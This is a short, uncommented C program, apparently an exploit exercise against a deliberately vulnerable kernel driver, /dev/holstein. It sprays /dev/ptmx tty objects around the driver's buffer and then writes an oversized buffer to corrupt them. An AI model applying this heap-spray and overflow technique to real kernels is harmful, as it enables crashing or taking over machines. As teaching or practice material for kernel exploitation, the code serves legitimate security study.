#include <fcntl.h>
#include <string.h>
#include <unistd.h>

int main() {
  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
  }

  int fd = open("/dev/holstein", O_RDWR);
  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
  }
  char buf[0x500];
  memset(buf, 'A', 0x500);
  write(fd, buf, 0x500);
  close(fd);
}
